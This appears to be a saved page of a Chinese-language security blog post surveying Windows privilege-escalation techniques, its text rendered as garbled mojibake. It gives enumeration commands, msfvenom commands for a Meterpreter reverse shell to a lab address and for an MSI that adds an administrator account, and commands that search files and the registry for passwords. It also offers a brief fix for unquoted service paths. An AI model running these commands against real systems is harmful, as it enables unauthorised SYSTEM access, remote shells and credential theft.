<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Windowsææƒæ–¹æ³•æ±‡æ€» | ConsT27's Blog</title><meta name="keywords" content="ææƒ"><meta name="author" content="ConsT27"><meta name="copyright" content="ConsT27"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="æ— å¼•å·æœåŠ¡è·¯å¾„ ï¼ˆ Trusted Service Paths ï¼‰å…ˆè¯´å®ç”¨åº¦ï¼Œæ¯”è¾ƒè¢«åŠ¨ï¼Œè€Œä¸”æ¯”è¾ƒçœ‹è„¸ã€‚ Windowsä¸‹æœåŠ¡çš„æƒé™é€šå¸¸æ˜¯SYSTEMã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ›¿æ¢æœåŠ¡çš„å¯åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼ˆå¦‚åå¼¹shellï¼‰ï¼Œå³ç›¸å½“äºè·å¾—äº†SYSTEMæƒé™ï¼Œè¾¾åˆ°äº†ææƒçš„ç›®çš„ã€‚æ— å¼•å·æœåŠ¡è·¯å¾„æœ‰å¯èƒ½ä¼šå¯¼è‡´è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚æ‰€è°“æ— å¼•å·æœåŠ¡è·¯å¾„ï¼Œå°±æ˜¯æœåŠ¡å¯åŠ¨ç¨‹åºçš„è·¯å¾„ä¸­åŒ…å«äº†ç©ºæ ¼ä¸”æœªè¢«å¼•å·åŒ…å«èµ·æ¥ã€‚æ¯”å¦‚è¿™æ · C:\">
<meta property="og:type" content="article">
<meta property="og:title" content="Windowsææƒæ–¹æ³•æ±‡æ€»">
<meta property="og:url" content="http://const27.com/2021/06/28/Windows%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="ConsT27&#39;s Blog">
<meta property="og:description" content="æ— å¼•å·æœåŠ¡è·¯å¾„ ï¼ˆ Trusted Service Paths ï¼‰å…ˆè¯´å®ç”¨åº¦ï¼Œæ¯”è¾ƒè¢«åŠ¨ï¼Œè€Œä¸”æ¯”è¾ƒçœ‹è„¸ã€‚ Windowsä¸‹æœåŠ¡çš„æƒé™é€šå¸¸æ˜¯SYSTEMã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ›¿æ¢æœåŠ¡çš„å¯åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼ˆå¦‚åå¼¹shellï¼‰ï¼Œå³ç›¸å½“äºè·å¾—äº†SYSTEMæƒé™ï¼Œè¾¾åˆ°äº†ææƒçš„ç›®çš„ã€‚æ— å¼•å·æœåŠ¡è·¯å¾„æœ‰å¯èƒ½ä¼šå¯¼è‡´è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚æ‰€è°“æ— å¼•å·æœåŠ¡è·¯å¾„ï¼Œå°±æ˜¯æœåŠ¡å¯åŠ¨ç¨‹åºçš„è·¯å¾„ä¸­åŒ…å«äº†ç©ºæ ¼ä¸”æœªè¢«å¼•å·åŒ…å«èµ·æ¥ã€‚æ¯”å¦‚è¿™æ · C:\">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/ch.png">
<meta property="article:published_time" content="2021-06-28T13:52:05.785Z">
<meta property="article:modified_time" content="2021-02-19T08:50:44.681Z">
<meta property="article:author" content="ConsT27">
<meta property="article:tag" content="ææƒ">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/ch.png"><link rel="shortcut icon" href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210219183209.png"><link rel="canonical" href="http://const27.com/2021/06/28/Windows%E6%8F%90%E6%9D%83/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-02-19 16:50:44'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="ConsT27's Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">åŠ è½½ä¸­...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw Link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw About"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://const27blog.oss-cn-beijing.aliyuncs.com/img/ch.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ConsT27's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw Link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw About"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Windowsææƒæ–¹æ³•æ±‡æ€»</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2021-06-28T13:52:05.785Z" title="å‘è¡¨äº 2021-06-28 21:52:05">2021-06-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2021-02-19T08:50:44.681Z" title="æ›´æ–°äº 2021-02-19 16:50:44">2021-02-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">5.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>24åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="æ— å¼•å·æœåŠ¡è·¯å¾„-ï¼ˆ-Trusted-Service-Paths-ï¼‰"><a href="#æ— å¼•å·æœåŠ¡è·¯å¾„-ï¼ˆ-Trusted-Service-Paths-ï¼‰" class="headerlink" title="æ— å¼•å·æœåŠ¡è·¯å¾„ ï¼ˆ Trusted Service Paths ï¼‰"></a>æ— å¼•å·æœåŠ¡è·¯å¾„ ï¼ˆ <strong>Trusted Service Paths</strong> ï¼‰</h2><p>å…ˆè¯´å®ç”¨åº¦ï¼Œæ¯”è¾ƒè¢«åŠ¨ï¼Œè€Œä¸”æ¯”è¾ƒçœ‹è„¸ã€‚</p>
<p>Windowsä¸‹æœåŠ¡çš„æƒé™é€šå¸¸æ˜¯SYSTEMã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ›¿æ¢æœåŠ¡çš„å¯åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼ˆå¦‚åå¼¹shellï¼‰ï¼Œå³ç›¸å½“äºè·å¾—äº†SYSTEMæƒé™ï¼Œè¾¾åˆ°äº†ææƒçš„ç›®çš„ã€‚<br>æ— å¼•å·æœåŠ¡è·¯å¾„æœ‰å¯èƒ½ä¼šå¯¼è‡´è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚<br>æ‰€è°“æ— å¼•å·æœåŠ¡è·¯å¾„ï¼Œå°±æ˜¯æœåŠ¡å¯åŠ¨ç¨‹åºçš„è·¯å¾„ä¸­åŒ…å«äº†ç©ºæ ¼ä¸”æœªè¢«å¼•å·åŒ…å«èµ·æ¥ã€‚æ¯”å¦‚è¿™æ ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\floder1\service.exe</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºç©ºæ ¼çš„å­˜åœ¨ï¼ŒWindowsåœ¨å¯åŠ¨æœåŠ¡æ‰¾å¯»æœåŠ¡å¯åŠ¨é¡¹æ—¶ï¼Œå®ƒä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºè¿›è¡Œå¯åŠ¨é¡¹å¯»æ‰¾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Some.exe</span><br><span class="line">C:\Program Files\Some Folder\Service.exe</span><br></pre></td></tr></table></figure>
<p>è¿™å°±ç»™äº†æˆ‘ä»¬æœ‰æœºå¯ä¹˜çš„æœºä¼šï¼šå¦‚æœæˆ‘ä»¬åœ¨æœåŠ¡çš„ä¸Šå±‚ç›®å½•æœ‰å†™å…¥æˆ–å®Œå…¨æ§åˆ¶æƒé™ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å°†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨Windowsæœå¯»æœåŠ¡å¯åŠ¨é¡¹çš„æ›´é å‰é¡ºåºä¸Šã€‚</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143921.png" alt="QQæˆªå›¾20210217143921"></p>
<p>æˆ‘ä»¬ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æœç´¢å“ªäº›æœåŠ¡è·¯å¾„æ²¡æœ‰åŒ…å«å¼•å·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°ä¸€ä¸ªã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çš„æ€è·¯å¯èƒ½å°±æ˜¯åœ¨2345Explorerç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªProtect.exeäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦çœ‹çœ‹2345Explorerç›®å½•æˆ‘ä»¬çš„æƒé™å¦‚ä½•ã€‚</p>
<p>å…ˆæ¥ä¸€æ‰‹whoami /all.å‘ç°è‡ªå·±æ˜¯Usersç»„çš„ã€‚</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143934.png" alt="QQæˆªå›¾20210217143934"></p>
<p>ç„¶åä½¿ç”¨icaclså‘½ä»¤æŸ¥çœ‹åœ¨2345Explorerç›®å½•çš„æƒé™å¦‚ä½•</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143945.png" alt="QQæˆªå›¾20210217143945"></p>
<p>usersç»„æ˜¯å®Œå…¨æ§åˆ¶æƒï¼ˆFï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ç”¨msfvenomæ„é€ ä¸€ä¸ªåå¼¹shellçš„exeã€‚å‘½åä¸ºProtect.exeï¼Œæ”¾å…¥2345Explorerç›®å½•ã€‚æˆ‘è¿™é‡Œéšä¾¿ç¼–ç äº†ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http -e x86&#x2F;shikata_ga_nai LHOST&#x3D;192.168.111.129 LPORT&#x3D;10068 -f exe -o Protect.exe</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144053.png" alt="QQæˆªå›¾20210217144053"></p>
<p>ç„¶åæˆ‘ä»¬ç°åœ¨æ˜¯æ²¡æœ‰èƒ½åŠ›é‡å¯æœåŠ¡çš„ã€‚ã€‚åªèƒ½ç­‰ç®¡ç†å‘˜é‡å¯æœåŠ¡æˆ–è€…æœºå­é‡å¯ã€‚ç„¶åå°±æ‹¿åˆ°SYSTEMæƒé™äº†ã€‚ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œè¿™ä¸ªå‘ç‚¹æ˜¯å¦‚æœä¸€ä¸ªæœåŠ¡å¯åŠ¨ååœ¨ä¸€å®šæ—¶é—´å†…æœªä¸ Service Control Manager(SCM) é€šè®¯ï¼Œå°±ä¼šè¢«åœæ­¢ã€‚</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144102.png" alt="QQæˆªå›¾20210217144102"></p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦åœ¨æ‹¿åˆ°shellååŠæ—¶çš„è½¬ç§»è¿›ç¨‹æˆ–è€…æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·ã€‚<br>è½¬ç§»è¿›ç¨‹åœ¨msfä¸­å¾ˆç®€å•ï¼Œmeterpreterä¸­å…ˆç”¨psæŸ¥çœ‹è¿›ç¨‹ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªsystemæƒé™ï¼Œè®°ä½å…¶pidï¼Œç„¶å migrate PID å³å¯å®Œæˆè¿›ç¨‹è¿ç§»ã€‚</p>
<p>ä¸‹é¢æ¥è¯´è¯´é˜²æ²»æ–¹æ³•å§ã€‚è¿›å…¥æ³¨å†Œè¡¨ä¿®æ”¹çª—å£ï¼Œåœ¨ HKEY_LOCAL_MACHINE &gt;&gt; SYSTEM &gt;&gt; CurrentControlSet &gt;&gt; Services è·¯å¾„ä¸‹æ‰¾åˆ°å­˜åœ¨æ¼æ´çš„æœåŠ¡ï¼Œä¿®æ”¹å…¶ImagePathï¼ŒæŠŠè·¯å¾„å‰ååŠ ä¸ªå¼•å·å°±å¯äº†ã€‚</p>
<h2 id="æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼ˆVulnerable-Services-ï¼‰"><a href="#æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼ˆVulnerable-Services-ï¼‰" class="headerlink" title="æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼ˆVulnerable Services ï¼‰"></a>æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼ˆ<strong>Vulnerable Services</strong> ï¼‰</h2><p>åŒæ ·çœ‹è„¸ä¸”è¢«åŠ¨</p>
<p>è¿™ä¸ªæ”»å‡»æ–¹æ³•å¤§è‡´åˆ†ä¸¤ç±»<br>1.æ›¿æ¢æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¿™ä¸ªæ–¹æ³•è¾ƒä¸ºç®€å•ï¼Œå¦‚æœå¯¹æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨ç›®å½•æœ‰ä¿®æ”¹æƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„ç¨‹åºæ¥æ›¿æ¢åŸæœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶æœåŠ¡ã€‚è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œè€Œä¸”åŸºæœ¬ä¸Šæ”»å‡»æµç¨‹å’Œ<strong>Trusted Service Paths</strong>å¦‚å‡ºä¸€è¾™ï¼ŒåŒæ ·ä¹Ÿæ˜¯æ¯”è¾ƒè¢«åŠ¨åœ°ç­‰å¾…é‡å¯æœåŠ¡æ‰èƒ½å¼¹shellï¼Œå°±ä¸å†æ¼”ç¤ºäº†ã€‚<br>2.ä¿®æ”¹æœåŠ¡çš„å±æ€§ã€‚å¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹æœåŠ¡çš„ <strong>BINARY_PATH_NAME</strong> å±æ€§ï¼ˆè¿™ä¸ªå±æ€§ç”¨äºæŒ‡å‘æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¾ç½® <strong>BINARY_PATH_NAME</strong> çš„å€¼ä¸ºç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åé‡å¯æœåŠ¡æ—¶æˆ‘ä»¬çš„ç³»ç»Ÿå‘½ä»¤ä¼šè¢«æ‰§è¡Œã€‚</p>
<p>å¯¹äºåè€…ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¬¾å·¥å…·æ¥å¿«é€Ÿæ­ç¤ºå‡ºæˆ‘ä»¬èƒ½ä¿®æ”¹å“ªäº›æœåŠ¡çš„å±æ€§ã€‚<br>è¿™ä¸ªå·¥å…·æˆ‘ä»¬é‡‡ç”¨accesschk.exeï¼Œå®ƒæ˜¯å¾®è½¯äº§å‡ºçš„ï¼ŒåŸºæœ¬ä¸ä¼šæŠ¥æ¯’ã€‚</p>
<p>æˆ‘ä»¬é€šè¿‡è¯¥å·¥å…·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * &#x2F;accepteula</span><br><span class="line">or</span><br><span class="line">accesschk.exe -uwcqv &quot;Users&quot; * &#x2F;accepteula</span><br><span class="line">æ¥æŸ¥çœ‹Usersç»„ï¼ˆæ ¹æ®å®é™…æƒ…å†µæ¥å¡«å“ªä¸ªç»„ï¼‰å¯¹å“ªäº›æœåŠ¡æœ‰å“ªäº›æƒé™</span><br></pre></td></tr></table></figure>
<p>å¦‚æœå¯¹æŸä¸ªæœåŠ¡æœ‰service_all_accessæˆ–è€…ä»¥ä¸‹æƒé™ï¼Œå°±è¯´æ˜èƒ½å¯¹å…¶å±æ€§è¿›è¡Œä¿®æ”¹ã€‚</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144124.png" alt="QQæˆªå›¾20210217144124"></p>
<p>æ¯”å¦‚æˆ‘ä»¬å¯¹SpooleræœåŠ¡æœ‰service_all_accessæƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿™æ ·åšã€‚<br>é€šè¿‡ä¿®æ”¹å…¶binPathä¸ºæ¶æ„æŒ‡ä»¤ï¼Œç„¶åç­‰å¾…ç®¡ç†å‘˜é‡å¯æœåŠ¡ï¼Œæˆ‘ä»¬çš„æ¶æ„æŒ‡ä»¤å°±ä¼šè¢«æ‰§è¡Œã€‚</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144141.png" alt="QQæˆªå›¾20210217144141"></p>
<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a><strong>AlwaysInstallElevated</strong></h2><p>å¦‚æœwindowså¯ç”¨äº†å¦‚ä¸‹æ³¨å†Œè¡¨é¡¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">â€œAlwaysInstallElevatedâ€&#x3D;dword:00000001 </span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">â€œAlwaysInstallElevatedâ€&#x3D;dword:00000001</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆæ‰€æœ‰msiï¼ˆwindowsåº”ç”¨å®‰è£…ç¨‹åºï¼‰éƒ½ä¼šä»¥SYSTEMæƒé™è¿è¡Œã€‚æ­¤æ—¶å¦‚æœæˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªæ¶æ„msiç¨‹åºï¼Œå³å¯è¾¾åˆ°ææƒç›®çš„<br>åŒæ—¶éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œè¿™ä¸ªæ³¨å†Œè¡¨é¡¹ä¸ä¸€å®šæ€»æ˜¯å­˜åœ¨çš„ã€‚ï¼ˆæ¯”å¦‚æˆ‘çš„å®éªŒæœº</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡reg queryæ¥éªŒè¯è¿™ä¸¤æ¡æ³¨å†Œè¡¨é¡¹çš„æƒ…å†µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
<p>è‹¥å‡ä¸º1ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡msfvenomç”Ÿæˆæ¶æ„msiæ¥ææƒ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;adduser USER&#x3D;rottenadmin PASS&#x3D;P@ssword123! -f msi -o rotten.msi</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ‰§è¡Œï¼Œè·å¾—ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ã€‚</p>
<h2 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h2><p><em>Unattend.xml</em> <em>sysprep.xmlå’Œsysprep.infæ–‡ä»¶</em><code>GPP.xml</code> å­˜åœ¨ç€ä¸€å®šä¿¡æ¯æ³„éœ²ï¼Œä»–ä»¬é€šå¸¸å­˜åœ¨äºä»¥ä¸‹è·¯å¾„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Panther\</span><br><span class="line">C:\Windows\Panther\Unattend\</span><br><span class="line">C:\Windows\System32\</span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°åï¼Œæ‰¾åˆ° <em>Unattend.xml</em> æ–‡ä»¶ä¸­çš„ <UserAccounts> æ ‡ç­¾ã€‚å°±æœ‰å¯èƒ½æ‰¾åˆ°ç”¨æˆ·çš„åŠ å¯†åçš„å¯†ç ã€‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;UserAccounts&gt;</span><br><span class="line">    &lt;LocalAccounts&gt;</span><br><span class="line">        &lt;LocalAccount&gt;</span><br><span class="line">            &lt;Password&gt;</span><br><span class="line">                &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ&#x3D;&lt;&#x2F;Value&gt; &#x2F;&#x2F;PASSWORD</span><br><span class="line">                &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt;</span><br><span class="line">            &lt;&#x2F;Password&gt;</span><br><span class="line">            &lt;Description&gt;Local Administrator&lt;&#x2F;Description&gt;</span><br><span class="line">            &lt;DisplayName&gt;Administrator&lt;&#x2F;DisplayName&gt;</span><br><span class="line">            &lt;Group&gt;Administrators&lt;&#x2F;Group&gt;</span><br><span class="line">            &lt;Name&gt;Administrator&lt;&#x2F;Name&gt;</span><br><span class="line">        &lt;&#x2F;LocalAccount&gt;</span><br><span class="line">    &lt;&#x2F;LocalAccounts&gt;</span><br><span class="line">&lt;&#x2F;UserAccounts&gt;</span><br><span class="line">ä¸€äº›æ•æ„Ÿæ–‡ä»¶æŸ¥è¯¢æŒ‡ä»¤</span><br><span class="line">C:\Users\user\Desktop&gt; dir C:\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \*password\*</span><br><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>
<h2 id="åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»"><a href="#åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»" class="headerlink" title="åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»"></a>åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»</h2><p>refer:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p>
